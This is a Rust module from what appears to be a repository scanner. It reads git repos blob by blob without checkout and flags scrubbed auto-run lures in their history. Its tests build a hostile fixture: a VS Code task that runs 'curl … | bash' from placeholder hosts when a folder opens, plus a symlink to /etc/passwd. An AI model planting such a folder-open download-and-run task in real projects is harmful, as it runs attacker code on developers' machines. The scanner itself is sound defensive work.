//! Git repositories by URL. The repo is never checked out: a checkout is where git runs filters,
//! follows symlinks and has had case-folding bugs on macOS. Instead a bare shallow clone is read
//! blob by blob and written out by us.

use std::io::{BufRead, BufReader, Read, Write};
use std::path::Path;
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

use ureq::http::Uri;

use crate::fetch::check_public;
use crate::package::{Budget, Unpacked, safe_rel, write_inert};

const CLONE_TIMEOUT: Duration = Duration::from_secs(180);
const HISTORY_DEPTH: &str = "50";
const HISTORY_MAX: usize = 16 * 1024 * 1024;
/// History is only diffed where a scrubbed lure would have run by itself.
const AUTO_RUN_PATHS: &[&str] = &[
    ":(glob)**/.vscode/tasks.json",
    ":(glob)**/.cursor/tasks.json",
    ":(glob)**/.windsurf/tasks.json",
    ":(glob)**/*.code-workspace",
    ":(glob)**/package.json",
    ":(glob)**/setup.py",
    ":(glob)**/build.rs",
    ":(glob)**/.envrc",
    ":(glob)**/Makefile",
    ":(glob)**/.husky/*",
    ":(glob)**/*.sh",
];
const KNOWN_HOSTS: &[&str] = &["github.com", "gitlab.com", "bitbucket.org", "codeberg.org"];

/// A repository address on a known forge, or any https address ending in `.git`.
pub fn repo_url(input: &str) -> Option<String> {
    if !input.to_ascii_lowercase().starts_with("https://") {
        return None;
    }
    let uri: Uri = input.parse().ok()?;
    let host = uri.host()?.to_ascii_lowercase();
    let segments: Vec<&str> = uri.path().split('/').filter(|s| !s.is_empty()).collect();
    if KNOWN_HOSTS.contains(&host.as_str()) {
        let (owner, repo) = (segments.first()?, segments.get(1)?);
        let repo = repo.trim_end_matches(".git");
        return Some(format!("https://{host}/{owner}/{repo}.git"));
    }
    uri.path().ends_with(".git").then(|| input.to_string())
}

fn git(dir: &Path) -> Command {
    let mut c = Command::new("git");
    c.current_dir(dir)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GIT_LFS_SKIP_SMUDGE", "1")
        .args([
            "-c",
            "protocol.allow=never",
            "-c",
            "protocol.https.allow=always",
            "-c",
            "credential.helper=",
            "-c",
            "core.hooksPath=/dev/null",
            "-c",
            "core.fsmonitor=false",
        ]);
    c
}

pub fn fetch_repo(url: &str) -> Result<Unpacked, String> {
    let uri: Uri = url.parse().map_err(|_| "not a valid address".to_string())?;
    check_public(&uri)?;

    let dir = tempfile::Builder::new()
        .prefix("bee-eater-repo-")
        .tempdir()
        .map_err(|e| format!("could not make a scratch folder: {e}"))?;
    let bare = dir.path().join("bare.git");
    let out = dir.path().join("tree");

    let mut child = git(dir.path())
        .args([
            "clone",
            "--quiet",
            "--bare",
            "--depth",
            HISTORY_DEPTH,
            "--no-tags",
            "--",
            url,
        ])
        .arg(&bare)
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("could not start git: {e}"))?;
    let started = Instant::now();
    let status = loop {
        if let Some(s) = child.try_wait().map_err(|e| e.to_string())? {
            break s;
        }
        if started.elapsed() > CLONE_TIMEOUT {
            let _ = child.kill();
            let _ = child.wait();
            return Err("the clone took longer than three minutes".into());
        }
        std::thread::sleep(Duration::from_millis(200));
    };
    if !status.success() {
        let mut err = String::new();
        if let Some(mut e) = child.stderr.take() {
            let _ = e.read_to_string(&mut err);
        }
        let last = err
            .lines()
            .last()
            .unwrap_or("")
            .trim()
            .trim_start_matches("fatal: ");
        return Err(if last.is_empty() {
            "git could not clone it".into()
        } else if last.contains("could not read Username") || last.contains("Authentication failed")
        {
            "the repository does not exist or is private; only public repositories are read".into()
        } else {
            bee_evidence::sanitise_excerpt(last, 200)
        });
    }

    let mut notes = read_bare(&bare, &out)?;
    notes.retain(|n| !n.starts_with("Only the latest commit"));
    let (history, history_notes) = read_history(&bare);
    notes.extend(history_notes);
    Ok(Unpacked {
        history,
        root: out,
        label: url.to_string(),
        notes,
        _dir: dir,
    })
}

/// Writes every blob at HEAD of `bare` under `out` as a plain file, and nothing else.
fn read_bare(bare: &Path, out: &Path) -> Result<Vec<String>, String> {
    let listing = git(bare)
        .args(["ls-tree", "-r", "-z", "--full-tree", "HEAD"])
        .output()
        .map_err(|e| e.to_string())?;
    if !listing.status.success() {
        return Err("the repository has no commits to read".into());
    }

    let mut budget = Budget::new();
    let mut submodules = 0usize;
    let mut blobs = Vec::new();
    for entry in listing.stdout.split(|b| *b == 0).filter(|e| !e.is_empty()) {
        let entry = String::from_utf8_lossy(entry);
        let Some((meta, path)) = entry.split_once('\t') else {
            continue;
        };
        let mut parts = meta.split(' ');
        let (mode, kind, oid) = (parts.next(), parts.next(), parts.next());
        match (mode, kind, oid) {
            (Some("120000"), _, _) => budget.skipped_links += 1,
            (Some("160000"), _, _) => submodules += 1,
            (Some(_), Some("blob"), Some(oid)) => {
                let rel = safe_rel(Path::new(path)).filter(|p| {
                    !p.components()
                        .any(|c| c.as_os_str().eq_ignore_ascii_case(".git"))
                });
                match rel {
                    Some(rel) => blobs.push((oid.to_string(), rel)),
                    None => budget.skipped_paths += 1,
                }
            }
            _ => {}
        }
    }

    let mut cat = git(bare)
        .args(["cat-file", "--batch"])
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn()
        .map_err(|e| e.to_string())?;
    let mut stdin = cat.stdin.take().ok_or("git cat-file has no input")?;
    let oids: Vec<String> = blobs.iter().map(|(o, _)| o.clone()).collect();
    // Written from a thread so a full output pipe cannot deadlock us against git.
    let writer = std::thread::spawn(move || {
        for oid in oids {
            if writeln!(stdin, "{oid}").is_err() {
                break;
            }
        }
    });
    let mut reader = BufReader::new(cat.stdout.take().ok_or("git cat-file has no output")?);
    let mut result = Ok(());
    for (oid, rel) in &blobs {
        let mut header = String::new();
        if reader.read_line(&mut header).map_err(|e| e.to_string())? == 0 {
            result = Err("git stopped before every file was read".to_string());
            break;
        }
        let mut fields = header.split_whitespace();
        let (got, size) = (
            fields.next(),
            fields.nth(1).and_then(|s| s.parse::<u64>().ok()),
        );
        let (Some(got), Some(size)) = (got, size) else {
            result = Err(format!("git could not read {oid}"));
            break;
        };
        if got != oid {
            result = Err("git answered out of order".into());
            break;
        }
        if let Err(e) = budget.take(size) {
            result = Err(e);
            break;
        }
        let mut data = vec![0u8; size as usize];
        reader.read_exact(&mut data).map_err(|e| e.to_string())?;
        let mut newline = [0u8; 1];
        reader.read_exact(&mut newline).map_err(|e| e.to_string())?;
        write_inert(out, rel, &data)?;
    }
    drop(reader);
    let _ = cat.kill();
    let _ = cat.wait();
    let _ = writer.join();
    result?;

    std::fs::create_dir_all(out).map_err(|e| e.to_string())?;
    let mut notes =
        vec!["Only the latest commit was read; the repository's history was not.".to_string()];
    if submodules > 0 {
        notes.push(format!("{submodules} submodule(s) were not fetched."));
    }
    budget.notes(&mut notes);
    Ok(notes)
}

/// Lines removed in the history the clone holds, scanned as they were. Returns the findings and
/// a note on how much history that was.
fn read_history(bare: &Path) -> (Vec<bee_evidence::Evidence>, Vec<String>) {
    let mut notes = Vec::new();
    let child = git(bare)
        .args([
            "log",
            "-p",
            "--no-color",
            "--no-ext-diff",
            "--no-textconv",
            "--no-renames",
            "-U0",
            "--format=%x00%h %ad",
            "--date=short",
            "HEAD",
            "--",
        ])
        .args(AUTO_RUN_PATHS)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::null())
        .spawn();
    let Ok(mut child) = child else {
        return (
            Vec::new(),
            vec!["The repository's history could not be read.".into()],
        );
    };
    let mut raw = Vec::new();
    if let Some(out) = child.stdout.take() {
        let _ = out.take(HISTORY_MAX as u64 + 1).read_to_end(&mut raw);
    }
    let _ = child.kill();
    let _ = child.wait();
    let truncated = raw.len() > HISTORY_MAX;
    raw.truncate(HISTORY_MAX);
    let log = String::from_utf8_lossy(&raw);

    let mut evidence = Vec::new();
    let mut seen = std::collections::HashSet::new();
    let mut hosts: std::collections::BTreeMap<String, std::collections::BTreeSet<String>> =
        Default::default();
    let mut commits = 0usize;
    let (mut commit, mut path, mut buf) = (String::new(), None::<String>, String::new());
    let mut in_header = false;

    let mut flush = |commit: &str, path: &Option<String>, buf: &mut String| {
        if let Some(p) = path
            && !buf.is_empty()
        {
            for e in bee_static::scan_removed(p, buf, commit) {
                if seen.insert((e.rule, p.clone())) {
                    evidence.push(e);
                }
            }
            hosts
                .entry(p.clone())
                .or_default()
                .extend(bee_static::removed_download_hosts(p, buf));
        }
        buf.clear();
    };

    for line in log.lines() {
        if let Some(c) = line.strip_prefix('\0') {
            flush(&commit, &path, &mut buf);
            commit = c.to_string();
            path = None;
            commits += 1;
        } else if line.starts_with("diff --git ") {
            flush(&commit, &path, &mut buf);
            path = None;
            in_header = true;
        } else if in_header {
            if let Some(p) = line.strip_prefix("--- ") {
                path = p.strip_prefix("a/").map(str::to_string);
            } else if line.starts_with("@@") {
                in_header = false;
            }
        } else if let Some(removed) = line.strip_prefix('-') {
            buf.push_str(removed);
            buf.push('\n');
        }
    }
    flush(&commit, &path, &mut buf);

    for (p, hs) in hosts {
        if hs.len() >= 3 {
            let list: Vec<_> = hs.into_iter().collect();
            evidence.push(
                bee_evidence::Evidence::new(
                    "rotating-hosts",
                    bee_evidence::Severity::Warning,
                    format!(
                        "This file has downloaded and run code from {} different addresses over its history ({}), the pattern of a campaign swapping in fresh hosts as old ones are blocked.",
                        list.len(),
                        list.join(", ")
                    ),
                )
                .at(&p, None),
            );
        }
    }

    notes.push(if truncated {
        "Only part of the history was read; it was too large.".to_string()
    } else {
        format!(
            "History was read for {commits} recent commit(s) that touched files which run by themselves; older history and other files' history were not."
        )
    });
    (evidence, notes)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn repo_addresses() {
        assert_eq!(
            repo_url("https://github.com/owner/take-home").as_deref(),
            Some("https://github.com/owner/take-home.git")
        );
        assert_eq!(
            repo_url("https://github.com/owner/take-home/tree/main/src").as_deref(),
            Some("https://github.com/owner/take-home.git")
        );
        assert_eq!(
            repo_url("https://bitbucket.org/team/assessment.git").as_deref(),
            Some("https://bitbucket.org/team/assessment.git")
        );
        assert_eq!(
            repo_url("https://git.example.com/a/b.git").as_deref(),
            Some("https://git.example.com/a/b.git")
        );
        assert_eq!(repo_url("https://github.com/owner"), None);
        assert_eq!(repo_url("https://example.com/install.sh"), None);
        assert_eq!(repo_url("http://github.com/owner/repo"), None);
    }

    /// Builds a hostile repository on disk and reads it the same way a remote one is read.
    #[test]
    fn a_hostile_tree_is_read_without_checkout() {
        let src = tempfile::tempdir().unwrap();
        let s = src.path();
        let run = |args: &[&str]| {
            let ok = Command::new("git")
                .current_dir(s)
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .args(args)
                .status()
                .unwrap()
                .success();
            assert!(ok, "git {args:?}");
        };
        run(&["init", "-q", "-b", "main"]);
        std::fs::write(s.join("index.js"), "module.exports = 1\n").unwrap();
        std::fs::write(s.join(".gitattributes"), "*.js filter=evil\n").unwrap();
        std::os::unix::fs::symlink("/etc/passwd", s.join("link")).unwrap();
        run(&["add", "-A"]);
        run(&[
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@t.invalid",
            "commit",
            "-qm",
            "x",
        ]);

        // A bare clone of a local path is refused by protocol.allow, so build the bare copy
        // directly and drive the reading half against it.
        let dir = tempfile::tempdir().unwrap();
        let bare = dir.path().join("bare.git");
        let ok = Command::new("git")
            .args(["clone", "-q", "--bare"])
            .arg(s)
            .arg(&bare)
            .status()
            .unwrap()
            .success();
        assert!(ok);
        let out = dir.path().join("tree");
        let notes = read_bare(&bare, &out).unwrap();
        let (history, _) = read_history(&bare);
        assert!(history.is_empty(), "{history:?}");
        assert_eq!(
            std::fs::read_to_string(out.join("index.js")).unwrap(),
            "module.exports = 1\n"
        );
        assert!(out.join(".gitattributes").is_file());
        assert!(
            std::fs::symlink_metadata(out.join("link")).is_err(),
            "links are never written"
        );
        assert!(notes.iter().any(|n| n.contains("link")), "{notes:?}");
        assert!(notes.iter().any(|n| n.contains("latest commit")));
    }

    #[test]
    fn a_scrubbed_lure_and_its_rotating_hosts_are_found_in_history() {
        let src = tempfile::tempdir().unwrap();
        let s = src.path();
        let run = |args: &[&str]| {
            let ok = Command::new("git")
                .current_dir(s)
                .env("GIT_CONFIG_GLOBAL", "/dev/null")
                .env("GIT_CONFIG_NOSYSTEM", "1")
                .args(["-c", "user.name=t", "-c", "user.email=t@t.invalid"])
                .args(args)
                .status()
                .unwrap()
                .success();
            assert!(ok, "git {args:?}");
        };
        run(&["init", "-q", "-b", "main"]);
        std::fs::create_dir(s.join(".vscode")).unwrap();
        for host in ["burner-1.invalid", "burner-2.invalid", "burner-3.invalid"] {
            let task = format!(
                "{{\"tasks\":[{{\"label\":\"lint\",\n\"command\":\"curl -L https://{host}/s | bash\",\n\"runOptions\":{{\"runOn\":\"folderOpen\"}}}}]}}\n"
            );
            std::fs::write(s.join(".vscode/tasks.json"), task).unwrap();
            run(&["add", "-A"]);
            run(&["commit", "-qm", host]);
        }
        std::fs::remove_file(s.join(".vscode/tasks.json")).unwrap();
        std::fs::write(s.join("index.js"), "module.exports = 1\n").unwrap();
        run(&["add", "-A"]);
        run(&["commit", "-qm", "tidy"]);

        let dir = tempfile::tempdir().unwrap();
        let bare = dir.path().join("bare.git");
        assert!(
            Command::new("git")
                .args(["clone", "-q", "--bare"])
                .arg(s)
                .arg(&bare)
                .status()
                .unwrap()
                .success()
        );

        let (history, notes) = read_history(&bare);
        let rules: Vec<_> = history.iter().map(|e| e.rule).collect();
        assert!(rules.contains(&"folder-open-task"), "{rules:?}");
        assert!(rules.contains(&"download-and-run"), "{rules:?}");
        let rotation = history
            .iter()
            .find(|e| e.rule == "rotating-hosts")
            .expect("rotation");
        assert!(
            rotation.summary.contains("3 different"),
            "{}",
            rotation.summary
        );
        assert!(
            history
                .iter()
                .all(|e| e.severity <= bee_evidence::Severity::Warning)
        );
        assert!(notes[0].contains("4 recent commit(s)"), "{notes:?}");
    }
}
